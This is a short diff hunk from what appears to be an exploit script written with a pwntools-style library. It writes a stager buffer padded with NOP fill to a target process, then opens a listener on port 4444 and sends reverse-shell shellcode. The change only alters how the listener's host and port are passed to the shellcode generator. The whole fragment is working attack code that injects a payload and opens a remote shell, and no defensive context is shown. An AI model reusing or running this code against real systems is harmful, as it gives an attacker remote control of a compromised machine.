@@ -29,5 +29,6 @@ buf += sc.nopfill('mmap_stager', 600, buf)
 
 p.write(buf)
 p.write_p64(0)
-with p.listen(4444) as port:
-    p.write(sc.reverse_shell(host='localhost', port=port))
+with p.listen(4444) as (host, port):
+    buf = sc.reverse_shell(host, port)
+    p.write(buf)
